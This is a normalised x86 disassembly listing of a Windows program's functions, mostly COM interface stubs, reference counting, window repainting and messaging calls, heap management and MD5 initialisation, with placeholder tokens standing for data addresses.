push ebx
mov ebx [ esp + 0x8 ]
lea eax [ esp + 0xc ]
push eax
call sub_412710
pop ebx
retn
sub_4124d0
push ecx
mov ecx [ esp + 0xc ]
mov [ esp ] 0x0
mov eax [ esp ]
push eax
push ecx
mov ecx [ esp + 0x10 ]
push edx
mov edx [ esp + 0x18 ]
call sub_412cc0
add esp 0x10
retn 0x8
sub_412650
push ecx
mov ecx [ esp + 0xc ]
mov [ esp ] 0x0
mov eax [ esp ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
call sub_413050
add esp 0x10
retn 0x8
sub_412bc0
cmp [ esi + 0x18 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
retn
mov eax [ esi + 0x4 ]
push eax
call sub_43f960
add esp 0x4
sub_413675
mov eax r-xdata
retn
sub_414960
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
mov [ esp + 0x4 ] eax
jmp edx
sub_415a40
sub [ esp + 0x4 ] 0x4
jmp sub_417c10
sub_415b20
mov eax 0x80004001
retn 0x4
sub_415b30
sub [ esp + 0x4 ] 0x8
jmp sub_417c10
sub_415b40
sub [ esp + 0x4 ] 0x8
jmp sub_417c40
sub_415b60
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx - 0x28 ]
mov [ eax ] edx
xor eax eax
retn 0x8
mov eax 0x80004005
retn 0x8
sub_415b80
mov eax 0x80004001
retn 0x8
sub_415bd0
mov eax [ esp + 0x4 ]
or [ eax + 0x6c ] 0x2
xor eax eax
retn 0x4
sub_415ca0
mov eax [ esp + 0x4 ]
add eax 0x4
mov [ esp + 0x4 ] eax
jmp [ InterlockedIncrement@IAT ]
sub_415d60
mov eax 0x800401a1
retn 0x8
sub_415d70
xor eax eax
retn 0xc
sub_415d80
xor eax eax
retn 0x10
sub_415d90
xor eax eax
retn 0x8
sub_415e3f
mov eax r-xdata
retn
sub_415e80
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
push edi
mov edi [ esp + 0xc ]
push eax
add ecx 0xffffffdc
push ecx
mov eax r--data
call sub_418de0
pop edi
retn 0xc
sub_415ef0
xor eax eax
retn 0x18
sub_4162f0
mov eax sub_4161c0
retn
sub_41660f
mov eax r-xdata
retn
sub_416650
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
push edi
mov edi [ esp + 0xc ]
push eax
add ecx 0xffffffdc
push ecx
mov eax r--data
call sub_418de0
pop edi
retn 0xc
sub_4167f0
mov eax 0x80004001
retn 0xc
sub_416800
mov eax [ esp + 0x4 ]
and [ eax + 0x6c ] 0xfffffffd
xor eax eax
retn 0x8
sub_416810
mov eax [ esp + 0x4 ]
and [ eax + 0x6c ] 0xfffffffe
mov ecx [ eax + 0x48 ]
test ecx ecx
je r-xdata
xor eax eax
retn 0x4
mov [ eax + 0x48 ] 0x0
mov eax [ ecx ]
push ecx
mov ecx [ eax + 0x8 ]
call ecx
sub_416970
mov eax [ esp + 0x4 ]
and [ eax + 0x6c ] 0xfffffffe
mov ecx [ eax + 0x48 ]
test ecx ecx
je r-xdata
xor eax eax
retn 0x8
mov [ eax + 0x48 ] 0x0
mov eax [ ecx ]
push ecx
mov ecx [ eax + 0x8 ]
call ecx
sub_4169a0
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x9c ]
not eax
and eax 0x1
retn 0x4
sub_4169c0
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x6c ]
shr eax 0x4
not eax
and eax 0x1
retn 0x4
sub_416a20
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x6c ]
shr eax 0x5
not eax
and eax 0x1
retn 0x4
sub_416a40
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
shl ecx 0x5
xor ecx [ eax + 0x6c ]
and ecx 0x20
xor [ eax + 0x6c ] ecx
xor eax eax
retn 0x8
sub_416be0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
mov eax [ edx - 0x28 ]
push ecx
push eax
call [ InvalidateRgn@IAT ]
xor eax eax
retn 0xc
sub_416c00
xor eax eax
retn 0x14
sub_416c40
sub [ esp + 0x4 ] 0xc
jmp sub_417c10
sub_416c50
sub [ esp + 0x4 ] 0xc
jmp sub_417c40
sub_416c60
sub [ esp + 0x4 ] 0xc
jmp sub_417c70
sub_416ca0
mov eax 0x80004001
retn 0x10
sub_416cb0
mov eax 0x1
retn 0xc
sub_416cc0
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
shl ecx 0x5
xor ecx [ eax + 0x68 ]
and ecx 0x20
xor [ eax + 0x68 ] ecx
xor eax eax
retn 0x8
sub_416ce0
sub [ esp + 0x4 ] 0x10
jmp sub_417c10
sub_416cf0
sub [ esp + 0x4 ] 0x10
jmp sub_417c40
sub_416d00
sub [ esp + 0x4 ] 0x10
jmp sub_417c70
sub_416d10
mov eax 0x80004001
retn 0x14
sub_416d20
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov eax r--data
call sub_418de0
pop edi
retn 0xc
sub_416d40
mov eax [ esp + 0x4 ]
add eax 0x18
mov [ esp + 0x4 ] eax
jmp [ InterlockedIncrement@IAT ]
sub_416ea0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
mov [ eax + 0x10 ] ecx
xor eax eax
retn 0x4
sub_416f8f
mov eax r-xdata
retn
sub_41703d
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_4172d0
add eax 0x4
cmp [ eax + 0x18 ] 0x0
je r-xdata
retn
push eax
mov [ eax + 0x18 ] 0x0
call [ DeleteCriticalSection@IAT ]
sub_417385
mov eax r-xdata
retn
sub_4173f0
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
shl ecx 0x7
xor ecx [ eax + 0x64 ]
and ecx 0x80
xor [ eax + 0x64 ] ecx
xor eax eax
retn 0x8
sub_417410
sub [ esp + 0x4 ] 0x14
jmp sub_417c10
sub_417420
sub [ esp + 0x4 ] 0x14
jmp sub_417c40
sub_417500
push esi
mov esi ecx
call sub_418fb0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_417520
sub ecx 0x38
jmp sub_417500
sub_417530
sub [ esp + 0x4 ] 0x1c
jmp sub_417c10
sub_417540
sub [ esp + 0x4 ] 0x1c
jmp sub_417c40
sub_417550
sub [ esp + 0x4 ] 0x1c
jmp sub_417c70
sub_4175d0
retn 0xc
sub_4175e0
sub [ esp + 0x4 ] 0x24
jmp sub_417c10
sub_4175f0
sub [ esp + 0x4 ] 0x24
jmp sub_417c40
sub_417600
sub [ esp + 0x4 ] 0x24
jmp sub_417c70
sub_417700
mov ecx [ esp + 0x4 ]
mov ecx [ ecx + 0x34 ]
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
mov edx [ ecx ]
mov [ esp + 0x4 ] ecx
mov eax [ edx + 0x28 ]
jmp eax
sub_417720
mov ecx [ esp + 0x4 ]
mov ecx [ ecx + 0x34 ]
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
mov edx [ ecx ]
mov [ esp + 0x4 ] ecx
mov eax [ edx + 0x2c ]
jmp eax
sub_417c10
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x2c ]
mov ecx [ eax ]
mov [ esp + 0x4 ] eax
mov eax [ ecx ]
jmp eax
sub_417c40
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x2c ]
mov ecx [ eax ]
mov [ esp + 0x4 ] eax
mov edx [ ecx + 0x4 ]
jmp edx
sub_417c70
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x2c ]
mov ecx [ eax ]
mov [ esp + 0x4 ] eax
mov edx [ ecx + 0x8 ]
jmp edx
sub_417ca0
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov [ eax ] 0x1
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_417e20
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push ebx
mov ebx [ esp + 0x10 ]
push eax
push ecx
push edx
call sub_417d20
pop ebx
retn 0x18
sub_417f86
mov eax r-xdata
retn
sub_418030
mov eax [ ecx ]
push eax
call [ SysFreeString@IAT ]
retn
sub_418040
mov eax ecx
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] 0xffffffff
retn
sub_4181fb
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_418570
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
xor ecx [ eax + 0x7c ]
and ecx 0x1
xor [ eax + 0x7c ] ecx
xor eax eax
retn 0x8
sub_4185c0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
mov eax [ edx - 0x28 ]
push ecx
push eax
call [ InvalidateRect@IAT ]
xor eax eax
retn 0xc
sub_418620
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x80 ]
mov [ eax ] edx
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_418650
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov [ eax + 0x84 ] ecx
push 0xfffffd40
add eax 0xffffffb4
push eax
call sub_418a60
xor eax eax
retn 0x8
sub_418680
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x84 ]
mov [ eax ] edx
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_4186b0
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov [ eax + 0x88 ] ecx
push 0xfffffd3f
add eax 0xffffffb4
push eax
call sub_418a60
xor eax eax
retn 0x8
sub_4186e0
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x88 ]
mov [ eax ] edx
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_418710
movsx ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
add ecx ecx
xor ecx [ eax + 0x7c ]
push 0xfffffd3b
and ecx 0x2
xor [ eax + 0x7c ] ecx
add eax 0xffffffb4
push eax
call sub_418a60
xor eax eax
retn 0x8
sub_418a30
mov ecx [ esp + 0x8 ]
xor eax eax
mov [ ecx ] ax
retn 0x8
sub_418a40
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_418b00
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov [ eax + 0x94 ] ecx
push 0xffffffff
add eax 0xffffffb4
push eax
call sub_418a60
xor eax eax
retn 0x8
sub_418b20
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x94 ]
mov [ eax ] edx
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_418b50
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov [ eax + 0x98 ] ecx
xor eax eax
retn 0x8
sub_418b70
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x98 ]
mov [ eax ] edx
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_418ba0
movsx ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
shl ecx 0x5
xor ecx [ eax + 0x7c ]
and ecx 0x20
xor [ eax + 0x7c ] ecx
xor eax eax
retn 0x8
sub_418bf0
movsx ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
shl ecx 0x6
xor ecx [ eax + 0x7c ]
and ecx 0x40
xor [ eax + 0x7c ] ecx
xor eax eax
retn 0x8
sub_418f50
mov eax [ esp + 0x4 ]
inc [ eax + 0x4 ]
mov eax [ eax + 0x4 ]
retn 0x4
sub_418f90
push esi
mov esi ecx
call sub_4192d0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
j_sub_418fb0
jmp sub_418fb0
sub_4193f9
mov eax r-xdata
retn
sub_419420
mov ecx [ eax ]
push ecx
call [ SysFreeString@IAT ]
retn
sub_419cd0
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x0
sub_419cf0
cmp [ esi + 0x4 ] 0x0
je r-xdata
retn
mov eax [ esi ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x0
sub_419dd0
add ecx 0x8
push ecx
call [ InterlockedIncrement@IAT ]
retn
sub_419de0
add ecx 0x8
push ecx
call [ InterlockedDecrement@IAT ]
retn
sub_419df0
mov eax [ ecx + 0x8 ]
retn
sub_419e50
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
push r--data
push r--data
push eax
call edx
retn 0x4
sub_419e70
mov eax 0x80004005
retn 0x10
sub_41a170
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
mov ecx [ esp + 0x18 ]
push edx
call sub_419f20
retn 0x10
sub_41a190
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
retn
sub_41a1b0
push esi
mov esi ecx
call sub_41a290
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_41a345
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000017
sete dl
mov eax edx
retn
sub_41a400
mov eax [ esi ]
push eax
call sub_43f97a
add esp 0x4
mov [ esi ] 0x0
retn
sub_41a508
mov eax r-xdata
retn
sub_41a55e
mov [ ebp - 0x4 ] 0x2
mov eax r-xdata
retn
sub_41a720
lea ecx [ eax + 0x4 ]
cmp [ eax ] ecx
je r-xdata
retn
jmp sub_41ae30
sub_41a790
mov ecx [ eax + 0x8 ]
push ecx
call [ CoTaskMemFree@IAT ]
retn
sub_41a8c0
mov eax [ esp + 0x8 ]
mul [ esp + 0xc ]
test edx edx
ja r-xdata
mov eax 0x80070057
retn
cmp eax 0xffffffff
jbe r-xdata
mov ecx [ esp + 0x4 ]
mov [ ecx ] eax
xor eax eax
retn
sub_41a8e0
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
call sub_43f985
add esp 0x10
mov [ esp + 0x4 ] eax
jmp sub_4237a0
sub_41aef0
push eax
call sub_441c3d
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov [ ecx ] eax
retn 0x4
push 0x8007000e
call sub_427e00
sub_41af10
movzx ecx cx
lea eax [ ecx - 0x30 ]
cmp eax 0x36
ja r-xdata
xor al al
movzx edx [ eax + lookup_table_41af44 ]
jmp [ edx * 4 + jump_table_41af34 ]
lea eax [ ecx - 0x37 ]
retn
lea eax [ ecx - 0x57 ]
retn
retn
sub_41b0b0
mov eax r-xdata
retn
sub_41b1fd
mov eax r-xdata
retn
sub_41b72e
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
int3
sub_41be56
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
int3
sub_41c0bf
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_41c430
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
mov ecx [ esp + 0x18 ]
push edx
call sub_41c1d0
retn 0x10
sub_41c640
push esi
mov esi ecx
mov eax esi
call sub_41c5c0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_41de70
push esi
mov esi ecx
push esi
call sub_41e010
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_41e940
push esi
mov esi ecx
call sub_41dd90
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_41ea70
mov eax sub_41e960
retn
sub_41ea80
retn 0x4
sub_41ea90
mov eax [ esi ]
test eax eax
je r-xdata
retn
push eax
call [ DeleteObject@IAT ]
test eax eax
je r-xdata
mov [ esi ] 0x0
j_sub_41f520
jmp sub_41f520
sub_41fd30
push 0x8007000e
call sub_427e00
sub_421160
mov [ eax ] r--data
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
retn
push eax
call [ DeleteObject@IAT ]
sub_421fd0
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_422110
cmp [ ecx + 0x29 ] 0x0
je r-xdata
mov eax 0x1
retn 0x4
mov eax [ ecx + 0x1c ]
mov edx [ eax ]
push ecx
mov ecx eax
mov eax [ edx + 0xc ]
call eax
sub_422170
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
jmp eax
sub_422260
or [ ecx + 0x4 ] 0x8
or eax 0xffffffff
push edi
mov edi ecx
mov [ ecx + 0x4c ] eax
mov [ ecx + 0x50 ] eax
call sub_422a00
pop edi
retn
sub_4228c0
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esi ] eax
mov eax esi
retn
j_sub_422960
jmp sub_422960
sub_4229f0
retn
sub_422c20
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
sub_422c80
mov eax [ esi ]
test eax eax
je r-xdata
retn
push eax
call [ FreeResource@IAT ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
sub_423780
push ebx
push esi
lea esi [ ecx + 0x58 ]
lea ebx [ esp + 0xc ]
call sub_41f960
pop esi
pop ebx
retn 0x4
sub_4237a0
mov eax [ esp + 0x4 ]
cmp eax 0x50
ja r-xdata
push 0x80004005
call sub_427e00
movzx ecx [ eax + lookup_table_4237e8 ]
jmp [ ecx * 4 + jump_table_4237d8 ]
push 0x8007000e
call sub_427e00
push 0x80070057
call sub_427e00
retn
sub_423940
mov eax [ esp + 0x4 ]
cmp eax [ ecx + 0x64 ]
jne r-xdata
retn 0x4
call [ ReleaseCapture@IAT ]
sub_423960
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov ecx [ ecx + 0x54 ]
push eax
mov eax [ esp + 0x8 ]
push edx
push eax
push ecx
call [ SendMessageW@IAT ]
retn 0xc
sub_423980
mov eax [ esp + 0x4 ]
movzx edx [ esp + 0x8 ]
mov ecx [ ecx + 0x54 ]
push eax
movzx eax [ esp + 0x10 ]
shl edx 0x10
or edx eax
push edx
push 0x111
push ecx
call [ SendMessageW@IAT ]
retn 0xc
sub_4239b0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov ecx [ ecx + 0x54 ]
push eax
mov eax [ esp + 0x8 ]
push edx
push eax
push ecx
call [ PostMessageW@IAT ]
retn 0xc
sub_4245f8
mov ecx [ ebp - 0x14 ]
push ecx
call sub_43f960
add esp 0x4
push 0x0
push 0x0
call sub_442eab
int3
sub_424bca
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
push eax
call sub_426100
push 0x0
push 0x0
call sub_442eab
int3
sub_424ce1
mov esi [ ebp + 0x8 ]
call sub_426630
push 0x0
push 0x0
call sub_442eab
int3
sub_425720
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push edx
push eax
add ecx 0x4
push ecx
call sub_4255c0
retn 0xc
sub_4258f0
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x29 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x29 ] 0x0
je r-xdata
sub_426040
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x31 ] 0x0
je r-xdata
sub_426140
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_4296c0
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_4261a0
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_429800
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_426d40
lea eax [ ecx + 0x4 ]
jmp sub_426b90
sub_426d50
mov [ ecx + 0x50 ] 0x0
retn
sub_426d60
cmp [ ecx + 0x4c ] 0x0
mov [ ecx + 0x50 ] 0x1
je r-xdata
retn
mov eax [ ecx + 0x54 ]
push eax
call [ UpdateWindow@IAT ]
sub_426f80
retn 0x8
sub_426fd0
xor eax eax
retn 0x4
sub_4274e0
mov ecx [ esi + 0x4 ]
lea eax [ esi + 0x8 ]
push eax
push ecx
call [ EndPaint@IAT ]
mov [ esi ] 0x0
retn
sub_428940
xor eax eax
push 0xffffffff
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] ax
push eax
mov eax [ esp + 0xc ]
mov ecx esi
call sub_429a10
mov eax esi
retn 0x4
sub_428aa0
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
retn
mov eax [ eax + 0x4 ]
retn
sub_429730
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_4296c0
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_4297a0
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_429800
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_4297c0
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ecx + 0x10 ]
retn
mov eax [ ecx + 0x10 ]
retn
sub_429950
cmp [ esi + 0x18 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] cx
retn
mov eax [ esi + 0x4 ]
push eax
call sub_43f960
add esp 0x4
sub_429b97
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x2
call sub_429ac0
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
sub_429f80
mov [ ecx ] r--data
jmp sub_43fb60
sub_429f90
push esi
mov esi ecx
mov [ esi ] r--data
call sub_43fb60
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_429fc0
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_43fb03
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_42a0ba
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] 0x2
call sub_429fe0
mov [ ebp + 0x8 ] eax
mov eax r-xdata
retn
sub_42a260
mov eax [ eax ]
cmp eax rw-data
je r-xdata
retn
push eax
call sub_43f960
pop ecx
sub_42a610
mov [ ecx ] r--data
retn
sub_42a620
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_42a640
xor eax eax
retn
sub_42a650
mov edx ecx
mov ecx [ esp + 0x4 ]
push 0x0
call sub_42b570
retn 0x8
sub_42a6e0
mov eax ecx
retn
sub_42a730
push esi
mov esi ecx
mov [ esi ] r--data
call sub_42ac70
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_42a800
push esi
mov esi ecx
mov [ esi ] r--data
call sub_42ac70
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_42a870
mov edx [ esp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x44 ]
push 0x0
push edx
mov edx [ esp + 0xc ]
push edx
call eax
retn 0x8
sub_42a930
push esi
mov esi ecx
mov [ esi ] r--data
call sub_42ac70
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_42ac50
push esi
mov esi ecx
call sub_42ac70
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_42ae90
push esi
mov esi ecx
call sub_42aeb0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_42b720
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x18 ]
jmp eax
sub_42b910
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x1c ]
jmp eax
sub_42bb60
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x20 ]
jmp eax
sub_42bc20
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x14 ]
jmp eax
sub_42bdc0
mov ecx [ esp + 0x8 ]
lea eax [ esp + 0xc ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push 0x20
push eax
call sub_4424a8
add esp 0x14
retn
sub_42bf70
cmp al 0x7f
jae r-xdata
mov eax 0x1
retn
movzx eax al
push eax
call sub_4426fa
add esp 0x4
retn
sub_42e430
push esi
mov esi eax
push 0x7d0
mov [ esi ] r--data
call sub_42e4b0
pop esi
retn
sub_42e520
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
push 0x3e8
call [ Sleep@IAT ]
mov eax 0x1
retn 0x4
mov ecx [ esp + 0x4 ]
push ecx
call eax
add esp 0x4
retn 0x4
sub_42e550
mov eax 0x1
retn 0x4
sub_42efaf
mov eax 0x1
retn
sub_42f160
xor ecx ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax ] 0x67452301
mov [ eax + 0x4 ] 0xefcdab89
mov [ eax + 0x8 ] 0x98badcfe
mov [ eax + 0xc ] 0x10325476
retn
sub_432ecd
add al 0x4
add eax [ esp + eax ]
add al 0x4
add al 0x4
add al 0x3
int3
sub_433811
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_43564a
add eax 0x5050503
add eax 0x4050505
int3
sub_43e210
test ecx ecx
jne r-xdata
mov eax [ esp + 0x4 ]
jmp sub_43e220
xor eax eax
retn
sub_43ebc0
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
push eax
call sub_441c3d
add esp 0x4
retn
sub_43ebe0
mov eax [ esp + 0x8 ]
push eax
call sub_44120e
pop ecx
retn
sub_43f0ce
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43fa1d
sub_43f175
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x14 ]
call sub_41a190
xor eax eax
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov eax esi
pop esi
retn
sub_43f191
mov edi edi
push esi
mov esi ecx
lea eax [ esi + 0x14 ]
push eax
call [ DeleteCriticalSection@IAT ]
lea ecx [ esi + 0x2c ]
pop esi
jmp sub_43f610
sub_43f238
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
push ecx
call [ HeapDestroy@IAT ]
sub_43f253
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push 0x0
push [ ecx + 0x4 ]
call [ HeapAlloc@IAT ]
pop ebp
retn 0x4
sub_43f26a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn 0x4
push [ ebp + 0x8 ]
push 0x0
push [ ecx + 0x4 ]
call [ HeapFree@IAT ]
sub_43f2c1
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push 0x0
push [ ecx + 0x4 ]
call [ HeapSize@IAT ]
pop ebp
retn 0x4
sub_43f32a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x4 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x4 ]
sub_43f531
mov edi edi
